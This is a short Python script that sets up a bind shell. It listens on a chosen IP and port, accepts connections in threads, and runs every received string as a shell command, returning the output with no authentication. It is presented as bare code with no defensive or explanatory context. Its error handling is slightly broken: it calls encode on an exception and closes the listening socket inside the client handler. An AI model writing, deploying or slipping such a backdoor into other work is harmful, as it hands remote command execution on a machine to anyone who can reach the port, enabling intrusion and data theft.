import socket
import subprocess
import argparse
import textwrap
import threading

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="specified IP address")
parser.add_argument("-p", "--port", help="specified port")
args = parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((args.target, int(args.port)))
sock.listen(5)

def handle_client(client):
	while True:
		response = client.recv(1024)
		try:
			output = subprocess.getoutput(response.decode())
			client.send(output.encode())
		except Exception as e:
			client.send(e.encode())
			sock.close()

while True:
	client_socket, client_addr = sock.accept()
	client_thread = threading.Thread(target=handle_client, args=(client_socket,))
	client_thread.start()




